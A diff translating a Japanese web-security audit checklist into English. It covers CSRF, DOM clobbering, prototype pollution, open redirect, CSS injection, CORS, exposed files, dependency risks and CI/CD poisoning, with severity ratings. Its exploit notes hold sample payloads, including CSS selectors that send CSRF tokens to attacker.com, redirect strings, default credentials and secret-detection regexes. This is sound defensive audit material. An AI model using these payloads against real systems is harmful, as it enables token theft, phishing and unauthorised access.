-  - Medium: 中間処理でサニタイズされるが不完全（`<img onerror=...>` を通す等）
-  - Low: Source が限定的（`window.name` のみ等）で発火条件が厳しい
+  - Critical: Direct path like `eval(location.hash.slice(1))`
+  - High: `innerHTML = data` where `data` is user-controllable
+  - Medium: Intermediate processing includes sanitization but it is incomplete (passes `<img onerror=...>`, etc.)
+  - Low: Source is limited (`window.name` only, etc.) with strict trigger conditions
 
 #### 3-2. Cross-Site Request Forgery (CSRF)
 
-- **WHAT**: 認証済みユーザーの意図しない操作を強制する攻撃
-- **WHERE**: 状態変更を行う全エンドポイント（POST / PUT / DELETE / PATCH）
+- **WHAT**: Attack that forces authenticated users to perform unintended actions
+- **WHERE**: All state-changing endpoints (POST / PUT / DELETE / PATCH)
 - **HOW TO EXPLOIT**:
-  - CSRF トークンの欠如 → `<form action="target.com/transfer" method="POST">` で自動送信
-  - `SameSite` Cookie 未設定 + CSRF トークンなし → クロスサイトからのリクエストに Cookie が付与
-  - **GET で状態変更**: `<img src="target.com/api/delete?id=123">` で画像タグ経由で実行
-  - JSON API でも CSRF は成立: `Content-Type: text/plain` でプリフライトを回避
-  - Flash / PDF 経由の CSRF（レガシー環境）
-- **WHY DANGEROUS**: パスワード変更、送金、アカウント設定変更を被害者の権限で実行
+  - No CSRF token → auto-submit via `<form action="target.com/transfer" method="POST">`
+  - No `SameSite` cookie + no CSRF token → cookies attached to cross-site requests
+  - **State change via GET**: `<img src="target.com/api/delete?id=123">` executed via image tag
+  - CSRF is possible even with JSON APIs: bypass preflight with `Content-Type: text/plain`
+  - CSRF via Flash / PDF (legacy environments)
+- **WHY DANGEROUS**: Password changes, fund transfers, account setting modifications executed under the victim's privileges
 - **SEVERITY**:
-  - Critical: 送金 / パスワード変更 / メールアドレス変更に CSRF 保護なし
-  - High: 管理者操作（ユーザー削除、権限変更）に CSRF 保護なし
-  - Medium: プロフィール更新など中程度の影響の操作に保護なし
-  - Low: 影響の小さい操作（テーマ変更等）に保護なし
+  - Critical: No CSRF protection on fund transfer / password change / email change
+  - High: No CSRF protection on admin operations (user deletion, permission changes)
+  - Medium: No protection on moderate-impact operations (profile updates)
+  - Low: No protection on low-impact operations (theme changes, etc.)
 
 #### 3-3. DOM Clobbering
 
-- **WHAT**: HTML 要素の `id` / `name` 属性でグローバル変数を上書きする攻撃
-- **WHERE**: `document.getElementById` の結果を信頼するコード、名前付きプロパティのフォールバック参照
-- **HOW TO EXPLOIT**: `<img id="isAdmin" src="x">` を注入すると `window.isAdmin` が truthy になる。`<form id="config"><input name="apiUrl" value="https://attacker.com"></form>` でオブジェクトプロパティを偽装
-- **WHY DANGEROUS**: セキュリティチェックのバイパス、設定値の改竄
+- **WHAT**: Attack that overwrites global variables via `id` / `name` attributes on HTML elements
+- **WHERE**: Code that trusts `document.getElementById` results, named property fallback references
+- **HOW TO EXPLOIT**: Injecting `<img id="isAdmin" src="x">` makes `window.isAdmin` truthy. `<form id="config"><input name="apiUrl" value="https://attacker.com"></form>` spoofs object properties
+- **WHY DANGEROUS**: Bypass of security checks, tampering with configuration values
 - **SEVERITY**:
-  - Critical: セキュリティ判定に使われる変数が clobber 可能
-  - High: API エンドポイント URL や設定値が clobber 可能
-  - Medium: UI 表示のみに影響
-  - Low: 実際に注入可能な HTML コンテキストが限定的
+  - Critical: Variables used in security decisions are clobberable
+  - High: API endpoint URLs or configuration values are clobberable
+  - Medium: Only affects UI display
+  - Low: HTML injection context where clobbering is feasible is limited
 
 #### 3-4. Prototype Pollution
 
-- **WHAT**: JavaScript オブジェクトの `__proto__` / `constructor.prototype` を汚染する攻撃
-- **WHERE**: `Object.assign()`, lodash `merge` / `set` / `defaultsDeep`, JSON パーサーの出力を直接マージ、クエリパラメータのパーサー
-- **HOW TO EXPLOIT**: `{"__proto__": {"isAdmin": true}}` を送信、`?__proto__[isAdmin]=true` をクエリパラメータで送信
-- **WHY DANGEROUS**: 全オブジェクトに属性を注入 → 認証バイパス、XSS（テンプレートエンジンでの悪用）、RCE（`child_process` のオプション汚染）
+- **WHAT**: Attack that pollutes `__proto__` / `constructor.prototype` of JavaScript objects
+- **WHERE**: `Object.assign()`, lodash `merge` / `set` / `defaultsDeep`, merging JSON parser output directly, query parameter parsers
+- **HOW TO EXPLOIT**: Send `{"__proto__": {"isAdmin": true}}`, send `?__proto__[isAdmin]=true` as query parameter
+- **WHY DANGEROUS**: Inject properties into all objects → authentication bypass, XSS (exploitation via template engines), RCE (polluting `child_process` options)
 - **SEVERITY**:
-  - Critical: Prototype pollution → RCE（`child_process.spawn` のオプションを汚染）
-  - High: Prototype pollution → 認証バイパス / XSS
-  - Medium: 汚染は成立するが悪用可能な Sink が見つからない
-  - Low: サーバーサイドでは影響があるがクライアントのみで影響が限定的
+  - Critical: Prototype pollution → RCE (polluting `child_process.spawn` options)
+  - High: Prototype pollution → authentication bypass / XSS
+  - Medium: Pollution succeeds but no exploitable sink found
+  - Low: Impact exists on server side but limited to client only
 
 #### 3-5. Open Redirect
 
-- **WHAT**: ユーザーを攻撃者のサイトにリダイレクトする脆弱性
-- **WHERE**: ログイン後のリダイレクト (`?next=`, `?redirect=`, `?return_url=`), OAuth の `redirect_uri`
+- **WHAT**: Vulnerability that redirects users to an attacker's site
+- **WHERE**: Post-login redirects (`?next=`, `?redirect=`, `?return_url=`), OAuth `redirect_uri`
 - **HOW TO EXPLOIT**: `https://target.com/login?next=https://attacker.com`, `//attacker.com`, `\/\/attacker.com`, `https://target.com@attacker.com`, `javascript:alert(1)`
-- **WHY DANGEROUS**: フィッシング（正規ドメインから遷移するため信頼されやすい）、OAuth トークンの窃取
+- **WHY DANGEROUS**: Phishing (trusted because the transition originates from a legitimate domain), OAuth token theft
 - **SEVERITY**:
-  - Critical: OAuth フローの `redirect_uri` がオープンリダイレクト可能
-  - High: ログインページからの任意 URL リダイレクト
-  - Medium: リダイレクト先がサブドメインに制限されるが、脆弱なサブドメインが存在
-  - Low: リダイレクト先がホワイトリスト方式だが一覧が広すぎる
+  - Critical: Open redirect possible in the OAuth flow's `redirect_uri`
+  - High: Arbitrary URL redirect from the login page
+  - Medium: Redirect target restricted to subdomains but a vulnerable subdomain exists
+  - Low: Redirect target uses allowlist but the list is overly broad
 
 #### 3-6. Clickjacking
 
-- **WHAT**: 透明な iframe でターゲットサイトを重ね、ユーザーのクリックを奪う攻撃
-- **WHERE**: 状態変更を行うボタン（削除、承認、送金）がある画面
-- **HOW TO EXPLOIT**: `X-Frame-Options` / CSP `frame-ancestors` が未設定 → iframe で読み込み可能 → 透明な iframe 上にボタンを配置
-- **WHY DANGEROUS**: ユーザーの意図しない操作（削除確認のクリック、権限付与の承認等）
+- **WHAT**: Attack that captures user clicks by overlaying the target site with a transparent iframe
+- **WHERE**: Screens with state-changing buttons (delete, approve, transfer)
+- **HOW TO EXPLOIT**: No `X-Frame-Options` / CSP `frame-ancestors` → loadable in iframe → place button over a transparent iframe
+- **WHY DANGEROUS**: Unintended user actions (clicking delete confirmation, granting permissions, etc.)
 - **SEVERITY**:
-  - Critical: ワンクリックで危険な操作が完了する画面（2段階確認なし）が iframe 可能
-  - High: 管理者画面が iframe 可能
-  - Medium: `X-Frame-Options` あるが `ALLOW-FROM` で広いドメインを許可
-  - Low: iframe 可能だが状態変更操作がない画面のみ
+  - Critical: Screen with one-click dangerous actions (no two-step confirmation) is iframeable
+  - High: Admin screens are iframeable
+  - Medium: `X-Frame-Options` exists but allows broad domains via `ALLOW-FROM`
+  - Low: Iframeable but only screens without state-changing actions
 
 #### 3-7. postMessage Abuse
 
-- **WHAT**: `window.postMessage` の origin 検証不備
-- **WHERE**: `addEventListener("message", handler)` のハンドラー
+- **WHAT**: Insufficient origin validation for `window.postMessage`
+- **WHERE**: `addEventListener("message", handler)` handlers
 - **HOW TO EXPLOIT**:
-  - `event.origin` の検証なし → 攻撃者の iframe からメッセージを送信
-  - `event.origin.indexOf("trusted.com")` のような不完全な検証 → `attacker-trusted.com` で回避
-  - 受信データを `innerHTML` や `eval` に渡す → DOM XSS
-- **WHY DANGEROUS**: XSS 相当の攻撃を iframe 間通信経由で実行
+  - No `event.origin` validation → send messages from attacker's iframe
+  - Incomplete validation like `event.origin.indexOf("trusted.com")` → bypass with `attacker-trusted.com`
+  - Received data passed to `innerHTML` or `eval` → DOM XSS
+- **WHY DANGEROUS**: XSS-equivalent attack executed via inter-iframe communication
 - **SEVERITY**:
-  - Critical: origin 検証なし + 受信データが `eval` / `innerHTML` に到達
-  - High: origin 検証が不完全（部分文字列マッチ）
-  - Medium: origin 検証あるが受信データのサニタイズが不十分
-  - Low: メッセージの受信は確認されるが悪用可能な Sink がない
+  - Critical: No origin validation + received data reaches `eval` / `innerHTML`
+  - High: Incomplete origin validation (substring match)
+  - Medium: Origin validated but received data sanitization is insufficient
+  - Low: Message reception is confirmed but no exploitable sink exists
 
 #### 3-8. CSS Injection
 
-- **WHAT**: ユーザー入力が CSS コンテキストに注入される脆弱性
-- **WHERE**: インラインスタイル、`<style>` タグ、CSS-in-JS のテンプレート
-- **HOW TO EXPLOIT**: `background: url(https://attacker.com/steal?token=` + CSS attribute selectors で CSRF トークンを1文字ずつ抽出 (`input[value^="a"] { background: url(attacker.com/?a) }`)
-- **WHY DANGEROUS**: CSRF トークンの窃取、UI 偽装（フィッシング）、データ抽出
+- **WHAT**: Vulnerability where user input is injected into CSS contexts
+- **WHERE**: Inline styles, `<style>` tags, CSS-in-JS templates
+- **HOW TO EXPLOIT**: `background: url(https://attacker.com/steal?token=` + CSS attribute selectors to extract CSRF tokens character by character (`input[value^="a"] { background: url(attacker.com/?a) }`)
+- **WHY DANGEROUS**: CSRF token theft, UI spoofing (phishing), data exfiltration
 - **SEVERITY**:
-  - Critical: CSS injection + CSRF トークンが属性値にある → トークン抽出可能
-  - High: 任意の CSS が注入可能（UI 偽装、キーロガー風の入力キャプチャ）
-  - Medium: CSS の一部のみ制御可能
-  - Low: サニタイズが存在するがバイパスの可能性
+  - Critical: CSS injection + CSRF token in attribute value → token extraction possible
+  - High: Arbitrary CSS injectable (UI spoofing, keylogger-style input capture)
+  - Medium: Only partial CSS is controllable
+  - Low: Sanitization exists but bypass may be possible
 
 ---
 
-## Agent 4: Data & Secrets Exfiltrator — データ・機密情報窃取専門 (both)
+## Agent 4: Data & Secrets Exfiltrator — Data & Sensitive Information Exfiltration Specialist (both)
 
-システムから機密情報を抽出できる経路を探す。コードベース内のハードコード秘密、エラーメッセージからの情報漏洩、過剰なデータ公開を調査する。
+Searches for paths to extract sensitive information from the system. Investigates hardcoded secrets in the codebase, information leakage through error messages, and excessive data exposure.
 
 ### Check Items
 
 #### 4-1. Hardcoded Secrets
 
-- **WHAT**: ソースコード内にハードコードされた秘密情報
-- **WHERE**: 設定ファイル、テストファイル、初期化コード、コメント、環境変数のデフォルト値
+- **WHAT**: Secret information hardcoded in source code
+- **WHERE**: Configuration files, test files, initialization code, comments, default values for environment variables
 - **PATTERN MATCHING**:
   ```
   # AWS
@@ -469,356 +469,356 @@ Template(user_input).render()
   xoxb-[0-9]+-[A-Za-z0-9]+                   # Slack Bot Token
   SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+        # SendGrid API key
   ```
-- **WHY DANGEROUS**: 攻撃者がリポジトリにアクセスするだけで外部サービスの全権限を奪取
+- **WHY DANGEROUS**: An attacker gains full access to external services simply by accessing the repository
 - **SEVERITY**:
-  - Critical: 本番 API キー / データベースクレデンシャルがソースコードにハードコード
-  - High: テスト用トークンだが本番環境でも有効、プライベートキーのコミット
-  - Medium: `.env.example` に実際の値が残存、コメント内のクレデンシャル
-  - Low: ダミー値だが本物のフォーマットに従っており混同リスクがある
+  - Critical: Production API keys / database credentials hardcoded in source code
+  - High: Test tokens that are also valid in production, committed private keys
+  - Medium: Actual values remaining in `.env.example`, credentials in comments
+  - Low: Dummy values but following the real format, creating confusion risk
 
 #### 4-2. Error Message Information Leakage
 
-- **WHAT**: エラーメッセージやレスポンスから内部情報が漏洩する箇所
-- **WHERE**: 例外ハンドラー、API エラーレスポンス、ログ出力、デバッグモード
+- **WHAT**: Locations where internal information leaks through error messages or responses
+- **WHERE**: Exception handlers, API error responses, log output, debug mode
 - **HOW TO EXPLOIT**:
-  - スタックトレースからフレームワーク、バージョン、内部パス構造を特定
-  - SQL エラーメッセージからテーブル名、カラム名、クエリ構造を抽出
-  - バリデーションエラーから存在するフィールド名 / 型を推測
-  - 404 / 403 の差分からリソースの存在を確認（user enumeration）
-- **WHY DANGEROUS**: 攻撃の偵察フェーズを大幅に短縮。内部構造の把握 → 的確な攻撃
+  - Identify framework, version, and internal path structure from stack traces
+  - Extract table names, column names, and query structure from SQL error messages
+  - Infer existing field names / types from validation errors
+  - Confirm resource existence from 404 / 403 differences (user enumeration)
+- **WHY DANGEROUS**: Dramatically shortens the reconnaissance phase of an attack. Understanding internal structure → precise targeting
 - **SEVERITY**:
-  - Critical: SQL クエリ全文、内部 IP アドレス、クレデンシャルがエラーメッセージに含まれる
-  - High: フルスタックトレース（フレームワーク + バージョン + ファイルパス）が外部に露出
-  - Medium: フレームワークのデフォルトエラーページ（Django debug, Express stack trace）が本番で有効
-  - Low: フィールドバリデーションメッセージが内部スキーマを示唆
+  - Critical: Full SQL queries, internal IP addresses, or credentials included in error messages
+  - High: Full stack traces (framework + version + file paths) exposed externally
+  - Medium: Framework default error pages (Django debug, Express stack trace) enabled in production
+  - Low: Field validation messages that hint at the internal schema
 
 #### 4-3. PII in Logs
 
-- **WHAT**: 個人識別情報（PII）がログに記録される箇所
-- **WHERE**: アクセスログ、アプリケーションログ、監査ログ、APM / トレース
-- **HOW TO EXPLOIT**: ログ収集システムへのアクセス権を取得した攻撃者が PII を大量抽出。ログの保持期間が長い場合、過去の全データが漏洩
+- **WHAT**: Locations where personally identifiable information (PII) is recorded in logs
+- **WHERE**: Access logs, application logs, audit logs, APM / traces
+- **HOW TO EXPLOIT**: An attacker who gains access to the log collection system can extract PII in bulk. When log retention periods are long, all historical data is leaked
 - **PATTERNS**:
   ```
-  console.log(req.body)           # リクエストボディ全体（パスワード含む可能性）
-  logger.info(f"User: {user}")    # User オブジェクト全体（email, phone 含む）
-  log.debug("Token: " + token)    # 認証トークンのログ出力
+  console.log(req.body)           # Entire request body (may contain passwords)
+  logger.info(f"User: {user}")    # Entire User object (may contain email, phone)
+  log.debug("Token: " + token)    # Authentication token logged
   ```
-- **WHY DANGEROUS**: GDPR / 個人情報保護法違反、ログ経由のクレデンシャル漏洩
+- **WHY DANGEROUS**: GDPR / data protection law violations, credential leakage via logs
 - **SEVERITY**:
-  - Critical: パスワード / 認証トークンがログに出力される
-  - High: クレジットカード番号、SSN などの機密 PII がログに出力される
-  - Medium: メールアドレス、電話番号がログに出力される
-  - Low: IP アドレスのみ（ただし GDPR では PII 扱い）
+  - Critical: Passwords / authentication tokens logged
+  - High: Sensitive PII (credit card numbers, SSN) logged
+  - Medium: Email addresses, phone numbers logged
+  - Low: IP addresses only (though considered PII under GDPR)
 
 #### 4-4. Excessive Data in API Responses
 
-- **WHAT**: API レスポンスに必要以上のデータが含まれる箇所
-- **WHERE**: ユーザー情報 API、一覧 API、GraphQL クエリ
+- **WHAT**: Locations where API responses contain more data than necessary
+- **WHERE**: User info APIs, listing APIs, GraphQL queries
 - **HOW TO EXPLOIT**:
-  - `/api/users/me` がパスワードハッシュ、内部 ID、管理者フラグを含む
-  - GraphQL の introspection で全スキーマを取得 → 隠しフィールドを発見
-  - 一覧 API にページネーションがなく全件取得可能
-  - `?include=password_hash,secret_key` のようなフィールド指定パラメータ
-- **WHY DANGEROUS**: 不要なデータ露出 → 攻撃の足がかり、PII 漏洩
+  - `/api/users/me` includes password hashes, internal IDs, admin flags
+  - GraphQL introspection to retrieve full schema → discover hidden fields
+  - Listing APIs without pagination allowing full data extraction
+  - Field selection parameters like `?include=password_hash,secret_key`
+- **WHY DANGEROUS**: Unnecessary data exposure → attack foothold, PII leakage
 - **SEVERITY**:
-  - Critical: パスワードハッシュ / 内部シークレットがレスポンスに含まれる
-  - High: 他ユーザーの PII が一覧 API で取得可能
-  - Medium: GraphQL introspection が本番で有効
-  - Low: 不要な内部フィールド（`created_by_ip` 等）が含まれる
+  - Critical: Password hashes / internal secrets included in responses
+  - High: Other users' PII obtainable via listing APIs
+  - Medium: GraphQL introspection enabled in production
+  - Low: Unnecessary internal fields (`created_by_ip`, etc.) included
 
 #### 4-5. Exposed Files and Directories
 
-- **WHAT**: 公開されるべきでないファイルやディレクトリがアクセス可能
-- **WHERE**: Web サーバーの公開ディレクトリ、静的ファイル配信設定
+- **WHAT**: Files or directories that should not be public are accessible
+- **WHERE**: Web server public directories, static file serving configuration
 - **HOW TO EXPLOIT**:
-  - `/.git/HEAD` → リポジトリの完全復元 (`git-dumper`)
-  - `/.env` → 環境変数（DB クレデンシャル等）の直接取得
-  - `/backup.sql`, `/dump.sql` → データベースダンプ
-  - `/.DS_Store` → ディレクトリ構造の推測
-  - `/server-status`, `/debug`, `/phpinfo.php` → サーバー情報の取得
-  - `/swagger-ui/`, `/api-docs/` → API 仕様の取得（認証なし）
-  - `/*.map` → ソースマップからソースコード復元
-- **WHY DANGEROUS**: ソースコード全体の漏洩、データベースの完全ダンプ、クレデンシャルの直接取得
+  - `/.git/HEAD` → full repository reconstruction (`git-dumper`)
+  - `/.env` → direct retrieval of environment variables (DB credentials, etc.)
+  - `/backup.sql`, `/dump.sql` → database dumps
+  - `/.DS_Store` → directory structure inference
+  - `/server-status`, `/debug`, `/phpinfo.php` → server information retrieval
+  - `/swagger-ui/`, `/api-docs/` → API specification retrieval (without authentication)
+  - `/*.map` → source code reconstruction from source maps
+- **WHY DANGEROUS**: Full source code leakage, complete database dumps, direct credential retrieval
 - **SEVERITY**:
-  - Critical: `.git` ディレクトリまたは `.env` ファイルが公開
-  - High: データベースダンプ / バックアップファイルが公開
-  - Medium: ソースマップが公開、Swagger UI が認証なしで公開
-  - Low: ディレクトリリスティングが有効（直接的な機密漏洩なし）
+  - Critical: `.git` directory or `.env` file is publicly accessible
+  - High: Database dumps / backup files are publicly accessible
+  - Medium: Source maps are publicly accessible, Swagger UI accessible without authentication
+  - Low: Directory listing is enabled (no direct sensitive information leakage)
 
 #### 4-6. Source Map Leaks
 
-- **WHAT**: 本番環境でソースマップが公開されている
-- **WHERE**: JavaScript / CSS のビルド出力、`//# sourceMappingURL=` コメント
-- **HOW TO EXPLOIT**: `.js.map` ファイルをダウンロード → 元のソースコード（TypeScript / JSX 含む）を完全復元 → ビジネスロジック、API エンドポイント、バリデーションルールを把握
-- **WHY DANGEROUS**: フロントエンドの完全な逆アセンブリ → 攻撃対象の特定が容易に
+- **WHAT**: Source maps are publicly accessible in the production environment
+- **WHERE**: JavaScript / CSS build output, `//# sourceMappingURL=` comments
+- **HOW TO EXPLOIT**: Download `.js.map` files → fully reconstruct original source code (including TypeScript / JSX) → understand business logic, API endpoints, validation rules
+- **WHY DANGEROUS**: Complete disassembly of the frontend → easy identification of attack targets
 - **SEVERITY**:
-  - Critical: ソースマップにサーバーサイドのシークレットが含まれている（SSR ビルド）
-  - High: ソースマップから認証ロジック / API キーの使用パターンが判明
-  - Medium: ビジネスロジックが完全に復元可能
-  - Low: ソースマップは存在するが有用な情報が限定的
+  - Critical: Source maps contain server-side secrets (SSR builds)
+  - High: Source maps reveal authentication logic / API key usage patterns
+  - Medium: Business logic is fully reconstructable
+  - Low: Source maps exist but contain limited useful information
 
 ---
 
-## Agent 5: Infra & Supply Chain Exploiter — インフラ・サプライチェーン攻撃専門 (both)
+## Agent 5: Infra & Supply Chain Exploiter — Infrastructure & Supply Chain Attack Specialist (both)
 
-設定不備、依存関係の脆弱性、CI/CD パイプラインの弱点を突いてシステムを侵害する経路を探す。
+Searches for paths to compromise systems through configuration flaws, dependency vulnerabilities, and CI/CD pipeline weaknesses.
 
 ### Check Items
 
 #### 5-1. CORS Misconfiguration
 
-- **WHAT**: Cross-Origin Resource Sharing の設定不備
-- **WHERE**: `Access-Control-Allow-Origin` ヘッダー、CORS ミドルウェア設定
+- **WHAT**: Cross-Origin Resource Sharing configuration flaws
+- **WHERE**: `Access-Control-Allow-Origin` headers, CORS middleware configuration
 - **HOW TO EXPLOIT**:
-  - `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` （ブラウザは拒否するが古いバージョンで動作する場合あり）
-  - Origin の動的反映: リクエストの `Origin` をそのまま `Access-Control-Allow-Origin` に設定 → 任意のサイトからクレデンシャル付きリクエスト
-  - 正規表現の不備: `.*\.example\.com` → `attackerexample.com` にマッチ
-  - `null` origin の許可 → `<iframe sandbox>` からのリクエストが成立
-- **WHY DANGEROUS**: 認証済みユーザーのデータを攻撃者のサイトから取得
+  - `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` (browsers reject this but older versions may honor it)
+  - Dynamic origin reflection: setting request's `Origin` directly as `Access-Control-Allow-Origin` → credentialed requests from any site
+  - Regex flaws: `.*\.example\.com` → matches `attackerexample.com`
+  - Allowing `null` origin → requests from `<iframe sandbox>` succeed
+- **WHY DANGEROUS**: Retrieving authenticated users' data from an attacker's site
 - **SEVERITY**:
-  - Critical: Origin 動的反映 + Credentials: true + 機密 API
-  - High: `null` origin 許可 + Credentials: true
-  - Medium: ワイルドカード `*` で非認証 API が公開（内部 API が意図せず公開）
-  - Low: CORS 設定が広いが Credentials が false
+  - Critical: Dynamic origin reflection + Credentials: true + sensitive API
+  - High: `null` origin allowed + Credentials: true
+  - Medium: Wildcard `*` exposing non-authenticated APIs (internal APIs unintentionally exposed)
+  - Low: Broad CORS settings but Credentials is false
 
 #### 5-2. Missing Security Headers
 
-- **WHAT**: セキュリティヘッダーの欠如
-- **WHERE**: HTTP レスポンスヘッダー、Web サーバー / リバースプロキシ設定
+- **WHAT**: Missing security headers
+- **WHERE**: HTTP response headers, web server / reverse proxy configuration
 
 | Header | Missing Impact | Severity |
 |--------|---------------|----------|
-| `Content-Security-Policy` | XSS の影響を増大。`unsafe-inline` / `unsafe-eval` があると実質無効 | High (XSS 存在時は Critical) |
-| `Strict-Transport-Security` | ダウングレード攻撃 (HTTPS → HTTP) で Cookie 窃取 | High |
-| `X-Content-Type-Options: nosniff` | MIME sniffing による XSS（HTML として解釈されるファイルアップロード） | Medium |
+| `Content-Security-Policy` | Amplifies XSS impact. Effectively useless with `unsafe-inline` / `unsafe-eval` | High (Critical when XSS exists) |
+| `Strict-Transport-Security` | Downgrade attacks (HTTPS → HTTP) for cookie theft | High |
+| `X-Content-Type-Options: nosniff` | XSS via MIME sniffing (file uploads interpreted as HTML) | Medium |
 | `X-Frame-Options` / CSP `frame-ancestors` | Clickjacking | Medium |
-| `Permissions-Policy` | 不要なブラウザ API（カメラ、マイク、位置情報）へのアクセス | Low |
-| `Referrer-Policy` | 機密情報（トークン等）を含む URL が Referer で外部に漏洩 | Medium |
-| `Cross-Origin-Opener-Policy` | Spectre 系サイドチャネル攻撃 | Low |
-| `Cross-Origin-Resource-Policy` | リソースの意図しないクロスオリジン読み込み | Low |
+| `Permissions-Policy` | Access to unnecessary browser APIs (camera, microphone, geolocation) | Low |
+| `Referrer-Policy` | URLs containing sensitive information (tokens, etc.) leaked via Referer | Medium |
+| `Cross-Origin-Opener-Policy` | Spectre-class side-channel attacks | Low |
+| `Cross-Origin-Resource-Policy` | Unintended cross-origin resource loading | Low |
 
-- **SEVERITY**: 個々のヘッダー欠如は Medium 以下だが、他の脆弱性と組み合わさることで Critical に昇格する
+- **SEVERITY**: Individual missing headers are Medium or below, but can escalate to Critical when combined with other vulnerabilities
 
 #### 5-3. Dependency Vulnerabilities
 
-- **WHAT**: 既知の脆弱性を持つ依存パッケージ
+- **WHAT**: Dependencies with known vulnerabilities
 - **WHERE**: `package.json`, `package-lock.json`, `requirements.txt`, `Pipfile.lock`, `go.sum`, `Cargo.lock`, `pom.xml`, `Gemfile.lock`
 - **HOW TO EXPLOIT**:
-  - **Known CVEs**: 公開されたエクスプロイトコードを使用して直接攻撃
-  - **Typosquatting**: 正規パッケージに類似した名前の悪意あるパッケージ (`lodash` → `1odash`, `colors` → `co1ors`)
-  - **Install scripts**: `postinstall` / `preinstall` スクリプトで任意コード実行
-  - **Dependency confusion**: 内部パッケージ名と同名のパッケージを公開レジストリに登録
-- **WHY DANGEROUS**: サプライチェーン攻撃は検知が困難で、影響範囲が広い
+  - **Known CVEs**: Direct attack using publicly available exploit code
+  - **Typosquatting**: Malicious packages with names similar to legitimate ones (`lodash` → `1odash`, `colors` → `co1ors`)
+  - **Install scripts**: Arbitrary code execution via `postinstall` / `preinstall` scripts
+  - **Dependency confusion**: Registering a package with the same name as an internal package on the public registry
+- **WHY DANGEROUS**: Supply chain attacks are difficult to detect and have wide impact
 - **SEVERITY**:
-  - Critical: RCE を可能にする既知 CVE を持つパッケージが本番で使用中
-  - High: 認証バイパス / データ漏洩を可能にする CVE、疑わしい install スクリプト
-  - Medium: DoS を可能にする CVE、メンテナンス停止パッケージ
-  - Low: 低リスクの CVE、非常に古いが直接的な脆弱性が不明
+  - Critical: Package with known RCE CVE in use in production
+  - High: CVE enabling authentication bypass / data leakage, suspicious install scripts
+  - Medium: CVE enabling DoS, unmaintained packages
+  - Low: Low-risk CVEs, very old packages without known direct vulnerabilities
 
 #### 5-4. Default Credentials and Debug Endpoints
 
-- **WHAT**: デフォルトクレデンシャル、デバッグ機能の残存
-- **WHERE**: 管理者パネル、データベース接続、キャッシュサーバー、メッセージブローカー
+- **WHAT**: Residual default credentials and debug functionality
+- **WHERE**: Admin panels, database connections, cache servers, message brokers
 - **HOW TO EXPLOIT**:
-  - デフォルトクレデンシャル: `admin:admin`, `root:root`, `admin:password`, `postgres:postgres`
-  - デバッグエンドポイント: `/debug`, `/console`, `/graphiql`, `/__debug__/`, `/actuator/`, `/_profiler`
-  - 環境変数: `DEBUG=true`, `NODE_ENV=development` が本番で有効
-  - ヘルスチェック: `/health` が内部状態（DB 接続文字列等）を露出
-- **WHY DANGEROUS**: 即座に管理者アクセス、内部情報の完全な露出
+  - Default credentials: `admin:admin`, `root:root`, `admin:password`, `postgres:postgres`
+  - Debug endpoints: `/debug`, `/console`, `/graphiql`, `/__debug__/`, `/actuator/`, `/_profiler`
+  - Environment variables: `DEBUG=true`, `NODE_ENV=development` active in production
+  - Health checks: `/health` exposing internal state (DB connection strings, etc.)
+- **WHY DANGEROUS**: Immediate admin access, complete exposure of internal information
 - **SEVERITY**:
-  - Critical: デフォルトクレデンシャルで管理者アクセス可能
-  - High: デバッグコンソールが認証なしで公開（Django debug toolbar, Spring Actuator）
-  - Medium: デバッグモードが有効で詳細なエラー情報が露出
-  - Low: ヘルスチェックが軽微な内部情報を含む
+  - Critical: Admin access possible with default credentials
+  - High: Debug console publicly accessible without authentication (Django debug toolbar, Spring Actuator)
+  - Medium: Debug mode enabled exposing detailed error information
+  - Low: Health checks contain minor internal information
 
 #### 5-5. Insecure TLS Configuration
 
-- **WHAT**: TLS / SSL の設定不備
-- **WHERE**: Web サーバー設定、API クライアントの証明書検証
+- **WHAT**: TLS / SSL configuration flaws
+- **WHERE**: Web server configuration, API client certificate verification
 - **HOW TO EXPLOIT**:
-  - 古い TLS バージョン (TLS 1.0 / 1.1) → BEAST, POODLE 攻撃
-  - 弱い暗号スイート (RC4, DES, NULL cipher) → 暗号解読
-  - 証明書検証の無効化 (`verify=False`, `rejectUnauthorized: false`, `InsecureSkipVerify: true`) → MITM
-  - HTTP から HTTPS へのリダイレクトなし → 初回アクセスの傍受
-- **WHY DANGEROUS**: 通信の傍受・改竄（Man-in-the-Middle）
+  - Old TLS versions (TLS 1.0 / 1.1) → BEAST, POODLE attacks
+  - Weak cipher suites (RC4, DES, NULL cipher) → cryptanalysis
+  - Certificate verification disabled (`verify=False`, `rejectUnauthorized: false`, `InsecureSkipVerify: true`) → MITM
+  - No HTTP to HTTPS redirect → interception of first request
+- **WHY DANGEROUS**: Traffic interception and modification (Man-in-the-Middle)
 - **SEVERITY**:
-  - Critical: 証明書検証の無効化が本番コードに存在
-  - High: TLS 1.0 / 1.1 が有効、弱い暗号スイートの使用
-  - Medium: HSTS なし、HTTP → HTTPS リダイレクトなし
-  - Low: 最新の暗号スイートのみ使用していないが現実的な攻撃は困難
+  - Critical: Certificate verification disabled in production code
+  - High: TLS 1.0 / 1.1 enabled, weak cipher suites in use
+  - Medium: No HSTS, no HTTP → HTTPS redirect
+  - Low: Not using only the latest cipher suites but practical attacks are infeasible
 
 #### 5-6. CI/CD Pipeline Poisoning
 
-- **WHAT**: CI/CD パイプラインを侵害してコードベースに悪意あるコードを注入する攻撃
-- **WHERE**: `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`, `Dockerfile`, ビルドスクリプト
+- **WHAT**: Attacks that inject malicious code into the codebase by compromising CI/CD pipelines
+- **WHERE**: `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`, `Dockerfile`, build scripts
 - **HOW TO EXPLOIT**:
-  - **Workflow injection**: `${{ github.event.issue.title }}` がシェルコマンドに展開 → コマンドインジェクション
-  - **Pull request target trigger**: `pull_request_target` + checkout of PR head → 外部 PR から secrets にアクセス
-  - **Self-hosted runner abuse**: 共有ランナーで前のジョブの残留データを読み取り
-  - **Artifact poisoning**: CI/CD の中間成果物を改竄
-  - **Secret exposure in logs**: CI ログに secrets がマスクされずに出力
-- **WHY DANGEROUS**: ビルドパイプラインの掌握 → 任意のコードをプロダクションにデプロイ
+  - **Workflow injection**: `${{ github.event.issue.title }}` expanded in shell commands → command injection
+  - **Pull request target trigger**: `pull_request_target` + checkout of PR head → external PR accesses secrets
+  - **Self-hosted runner abuse**: Reading residual data from previous jobs on shared runners
